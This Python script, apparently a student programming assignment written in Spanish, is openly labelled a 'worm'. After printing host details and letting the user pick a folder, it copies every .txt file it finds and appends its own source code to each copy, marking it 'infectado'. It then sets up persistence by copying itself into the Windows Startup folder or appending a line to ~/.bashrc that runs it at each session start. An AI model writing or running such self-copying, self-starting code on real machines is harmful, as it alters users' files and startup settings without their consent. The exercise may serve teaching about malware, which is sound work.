# Práctica Programada #4
# Jessica Montero Obando

import os
import platform
import shutil
import getpass
import subprocess
import time

#Esta función se encarga de crear la autoejecución del código, se agrega en el bash para el arranque de la sesión.
def autoejecucion():
    sistema = platform.system()
    ruta_script = os.path.abspath(__file__)

    if sistema == "Windows":
        usuario = getpass.getuser()
        ruta_startup = os.path.join(
            f"C:\\Users\\{usuario}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
        )
        try:
            if not os.path.exists(ruta_startup):
                os.makedirs(ruta_startup)
        except Exception as e:
            print(f"No se pudo crear la carpeta Startup: {e}")
            return

        destino = os.path.join(ruta_startup, "auto_worm.py")
        if not os.path.exists(destino):
            try:
                shutil.copy(ruta_script, destino)
                print(f"\n[+] Worm copiado a la carpeta de inicio: {destino}")
            except Exception as e:
                print(f"\n[!] Error copiando worm a inicio: {e}")
        else:
            print(f"\n[!] Ya existe una copia en inicio: {destino}")

    elif sistema in ("Linux", "Darwin"):
        bashrc = os.path.expanduser("~/.bashrc")
        linea = f'python3 "{ruta_script}"\n'
        try:
            with open(bashrc, "r") as f:
                contenido = f.read()
            if linea.strip() in contenido:
                print("\n[!] Autoejecución ya configurada en .bashrc")
                return
            with open(bashrc, "a") as f:
                f.write(f"\n# Autoejecución worm\n{linea}")
            print(f"\n[+] Autoejecución agregada a {bashrc}")
        except Exception as e:
            print(f"\n[!] Error al modificar {bashrc}: {e}")

    else:
        print(f"\n[!] Autoejecución no soportada para {sistema}")
        
        
#Este bloque se encarga de dar la información del SO del equipo donde se ejecuta el código.
def informacionHost():
    print("\n----- Información del Sistema Operativo en el host local -----\n")
    print(f"Nombre del sistema operativo: {platform.system()}")
    print(f"Versión del sistema operativo: {platform.release()}")
    print(f"Nombre del procesador: {platform.processor()}")
    print(f"Arquitectura del sistema: {platform.architecture()[0]}")
    print(f"Nombre del nodo de red: {platform.node()}")
    print("\n---------------------------------------------------------------\n")

#Este bloque se encarga de buscar las carpetas comúnmente usadas en Linux.
def obtener_carpetas_comunes_linux():
    nombres_linux = {
        "DESKTOP": "Escritorio",
        "DOCUMENTS": "Documentos",
        "DOWNLOAD": "Descargas",
        "MUSIC": "Música",
        "PICTURES": "Imágenes",
        "VIDEOS": "Videos"
    }
    carpetas = []
    for key, nombre in nombres_linux.items():
        try:
            resultado = subprocess.run(["xdg-user-dir", key], capture_output=True, text=True, check=True)
            ruta = resultado.stdout.strip()
            if os.path.isdir(ruta):
                carpetas.append(ruta)
        except Exception as e:
            print(f"\nNo se pudo obtener {nombre} con xdg-user-dir: {e}")
    return carpetas

#Este bloque se encarga de buscar las carpetas comúnmente usadas en Windows y MacOS.
def obtener_carpetas_comunes():
    sistema = platform.system()
    ruta_usuario = os.path.expanduser("~")
    carpetas = []

    if sistema == "Linux":
        carpetas = obtener_carpetas_comunes_linux()
    elif sistema == "Darwin":
        nombres_mac = ["Desktop", "Documents", "Downloads", "Music", "Pictures", "Movies"]
        for carpeta in nombres_mac:
            ruta = os.path.join(ruta_usuario, carpeta)
            if os.path.isdir(ruta):
                carpetas.append(ruta)
    elif sistema == "Windows":
        nombres_win = ["Desktop", "Documents", "Downloads", "Music", "Pictures", "Videos"]
        for carpeta in nombres_win:
            ruta = os.path.join(ruta_usuario, carpeta)
            if os.path.isdir(ruta):
                carpetas.append(ruta)
    else:
        print(f"\nSistema operativo no soportado para carpetas comunes: {sistema}")

    return carpetas

#Este bloque permite buscar subdirectorios dentro de carpetas.
def navegar_subdirectorios(ruta_base):
    actual = ruta_base
    while True:
        print(f"\nDirectorio actual: {actual}")
        try:
            subdirs = [d for d in os.listdir(actual) if os.path.isdir(os.path.join(actual, d))]
        except PermissionError:
            print("\nNo tienes permisos para leer este directorio, se usará esta carpeta.")
            break

        if not subdirs:
            print("\nNo hay subdirectorios. Se usará esta carpeta.")
            break

        print("\nSubdirectorios:")
        for i, d in enumerate(subdirs, 1):
            print(f"{i}. {d}")
        print("0. Usar este directorio")

        opcion = input("Selecciona un número para entrar o 0 para elegir este: ").strip()
        if opcion == "0":
            break
        elif opcion.isdigit() and 1 <= int(opcion) <= len(subdirs):
            actual = os.path.join(actual, subdirs[int(opcion) - 1])
        else:
            print("\nOpción inválida.")

    return actual

def seleccionar_directorio_usuario():
    ruta_usuario = os.path.expanduser("~")
    print(f"\nExplorando: {ruta_usuario}\n")

    carpetas_comunes = obtener_carpetas_comunes()

    # Carpetas visibles en directorio usuario (no ocultas)
    carpetas_visibles = [d for d in os.listdir(ruta_usuario) if os.path.isdir(os.path.join(ruta_usuario, d)) and not d.startswith('.')]

    # Combinar listas, eliminando duplicados manteniendo orden
    carpetas_unicas = []
    rutas_vistas = set()
    for ruta in carpetas_comunes + [os.path.join(ruta_usuario, d) for d in carpetas_visibles]:
        if ruta not in rutas_vistas and os.path.isdir(ruta):
            carpetas_unicas.append(ruta)
            rutas_vistas.add(ruta)

    if not carpetas_unicas:
        print("No se encontraron carpetas visibles ni comunes en el directorio del usuario.")
    else:
        print("Carpetas disponibles para iniciar:\n")
        for i, carpeta in enumerate(carpetas_unicas, 1):
            print(f"{i}. {os.path.basename(carpeta)} → {carpeta}")

    while True:
        print("\nOpciones:")
        print(f"\t0 - Usar el directorio actual: {os.getcwd()}")
        print("\t* - Ingresar una ruta manualmente")
        print("\to bien, elige un número de la lista anterior")
        
        eleccion = input("\nElige una opción: ").strip()

        if eleccion == "0":
            return os.getcwd()
        elif eleccion == "*":
            ruta = input("\nIngresa la ruta completa del directorio: ").strip()
            if os.path.isdir(ruta):
                return ruta
            else:
                print("\nEsa ruta no existe o no es válida. Intente de nuevo.")
        elif eleccion.isdigit():
            num = int(eleccion)
            if 1 <= num <= len(carpetas_unicas):
                ruta_base = carpetas_unicas[num - 1]
                return navegar_subdirectorios(ruta_base)
            else:
                print("\nNúmero fuera de rango.")
        else:
            print("\nEntrada inválida. Usa un número o '*'.")

#Este bloque contiene el worm que creará copias a los archivos .txt encontrados.
def infectar_txt(directorio, ruta_worm):
    print("\nCreando copias con archivo infectado...")
    time.sleep(1)
    
    with open(ruta_worm, "r", encoding="utf-8") as f:
        worm_code = f.read()

    exitosos = 0  

    for root, dirs, files in os.walk(directorio):
        for file in files:
            if file.endswith(".txt"):
                path_original = os.path.join(root, file)
                nombre, ext = os.path.splitext(file)
                path_copia = os.path.join(root, f"{nombre}_infectado{ext}")

                try:
                    with open(path_original, "r", encoding="utf-8") as f_txt:
                        contenido_original = f_txt.read()

                    if "# --- INFECTADO ---" in contenido_original:
                        print(f"Ya infectado (posible copia anterior): {path_original}")
                        continue

                    with open(path_copia, "w", encoding="utf-8") as f_copia:
                        f_copia.write(contenido_original)
                        f_copia.write("\n\n# --- INFECTADO ---\n")
                        f_copia.write(worm_code)

                    print(f"\nCopia infectada creada: {path_copia}")
                    exitosos += 1

                except Exception as e:
                    print(f"\nError al procesar {path_original}: {e}")
    
    if exitosos > 0:
        print(f"\nEstado: exitoso — {exitosos} archivo(s) infectado(s).\n")
    else:
        print("\nEstado: no se logró infectar ningún archivo.")
        

#Esta función contiene las llamadas a las funciones y un mensaje de despedida.     
def main():
    informacionHost()
    base_dir = seleccionar_directorio_usuario()
    ruta_worm = os.path.abspath(__file__)
    infectar_txt(base_dir, ruta_worm)
    autoejecucion()
    input("\nPresione ENTER para salir...")
    print("\n¡Hasta Pronto!\n")

#Flujo principal
main()


